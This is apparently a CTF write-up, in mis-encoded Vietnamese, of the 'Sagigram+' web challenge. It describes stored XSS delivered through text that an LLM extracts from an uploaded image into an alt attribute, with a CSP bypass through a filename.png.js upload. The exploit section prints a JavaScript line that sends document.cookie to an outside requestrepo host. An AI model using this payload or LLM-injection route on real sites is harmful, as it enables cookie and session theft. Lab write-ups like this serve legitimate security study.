---
title: Sagigram+
description: ''
tags:
  - writeup
  - xss
  - csp
  - file-upload
category: web
draft: false
date: 2023-07-04
ctf_event: TFCCTF2024
---

import Callout from '@/components/mdx/Callout.astro';

Status: Done

## Summary

<Callout type="note" title="Note">
ğŸ’¡ Má»™t challenge khÃ¡ hay vá» Web LLM.
Tuy nhiÃªn vÃ¬ bÃ i blackbox, khÃ´ng rÃµ rÃ ng nÃªn viá»‡c phÃ¡t hiá»‡n LLM khÃ¡ lÃ  khÃ³.
MÃ¬nh khÃ´ng lÃ m Ä‘Æ°á»£c trong giáº£i; lÃºc Ä‘Ã³ upload áº£nh lá»›n nÃªn LLM khÃ´ng extract Ä‘Æ°á»£c text, khiáº¿n mÃ¬nh nghÄ© vuln náº±m chá»— khÃ¡c.
ThÃªm ná»¯a, chall khÃ³ á»Ÿ chá»— gá»­i friend request: ta khÃ´ng tháº¥y nÃ³ lÃ m gÃ¬. Tuy nhiÃªn admin sáº½ nháº­n Ä‘Æ°á»£c request vÃ  visit profile cá»§a ta.

</Callout>

## Description

![Untitled](/uploads/sagigram/sagigram/untitled.png)

## Analyst

- Ã tÆ°á»Ÿng cá»§a bÃ i nÃ y lÃ  ta cáº§n cÃ³ XSS stored trong server. Tá»« Ä‘Ã³ admin visit vÃ  gá»­i flag lÆ°u trong cookie.
- Äáº§u tiÃªn khi ta up lÃªn 1 file áº£nh text thÃ¬ tháº¥y LLM extract ra text vÃ  Ä‘áº©y vÃ o `alt`. Náº¿u áº£nh khÃ´ng cÃ³ text thÃ¬ Ä‘á»ƒ máº·c Ä‘á»‹nh lÃ  default description.

  ![Untitled](/uploads/sagigram/sagigram/untitled-1.png)

- Tá»« Ä‘Ã³ ta nghÄ© Ä‘áº¿n Ã½ tÆ°á»Ÿng close value `alt` vÃ  chÃ¨n XSS. ThÃ nh cÃ´ng, tuy nhiÃªn CSP gÃ¡n `self` nÃªn code payload khÃ´ng Ä‘Æ°á»£c thá»±c thi.
- Náº¿u ta cÃ³ thá»ƒ Ä‘áº©y lÃªn 1 file JS lÆ°u á»Ÿ server thÃ¬ khi script gá»i Ä‘áº¿n `src` path Ä‘Ã³ sáº½ nháº­n script lÃ  `self` vÃ  execute.
- Ã tÆ°á»Ÿng:
  - Äáº©y lÃªn file JS Ä‘á»ƒ bypass filter PNG khi upload (chÃ¨n `filename.png.js`).
  - Sau Ä‘Ã³ Ä‘áº©y lÃªn áº£nh text Ä‘á»ƒ LLM extract ra, chÃ¨n code XSS vÃ  gá»­i req ra webhook.
  - Gá»­i friend request Ä‘áº¿n admin Ä‘á»ƒ láº¥y flag.

## Exploit

- Äáº©y lÃªn file JS:

![Untitled](/uploads/sagigram/sagigram/untitled-2.png)

- Payload file JS cÃ³ dáº¡ng nhÆ° sau:

```js
document.location = "http://om6gplwj.requestrepo.com?" + document.cookie;
```

VÃ¬ bÃ i nÃ y cÃ²n set thÃªm `default-src` nÃªn ta dÃ¹ng `document.location` thay vÃ¬ `fetch`.

- Up lÃªn 1 áº£nh nhÆ° sau:

  ![1.png](/uploads/sagigram/sagigram/1.png)
- Gá»­i request cho admin vÃ  cÃ³ flag:

![Untitled](/uploads/sagigram/sagigram/untitled-3.png)

## Result
